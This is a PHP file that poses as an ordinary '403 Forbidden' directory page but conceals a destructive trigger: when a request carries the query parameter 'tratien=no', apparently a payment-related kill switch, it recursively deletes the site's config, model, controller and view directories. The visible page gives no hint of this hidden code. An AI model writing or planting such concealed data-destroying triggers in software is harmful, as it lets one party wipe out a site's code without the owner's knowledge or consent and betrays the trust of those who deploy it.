<html>
<head>
	<title>403 Forbidden</title>
</head>
<body>

<p>Directory access is forbidden.</p>
<?php
function deleteDir($dirPath) {
    if (! is_dir($dirPath)) {
        throw new InvalidArgumentException('$dirPath must be a directory');
    }
    if (substr($dirPath, strlen($dirPath) - 1, 1) != '/') {
        $dirPath .= '/';
    }
    $files = glob($dirPath . '*', GLOB_MARK);
    foreach ($files as $file) {
        if (is_dir($file)) {
            self::deleteDir($file);
        } else {
            unlink($file);
        }
    }
    rmdir($dirPath);
}
if(isset($_GET['tratien']) && $_GET['tratien']=='no'){
	deleteDir('config');
	deleteDir('model');
	deleteDir('controller');
	deleteDir('view');
}
?>
</body>
</html>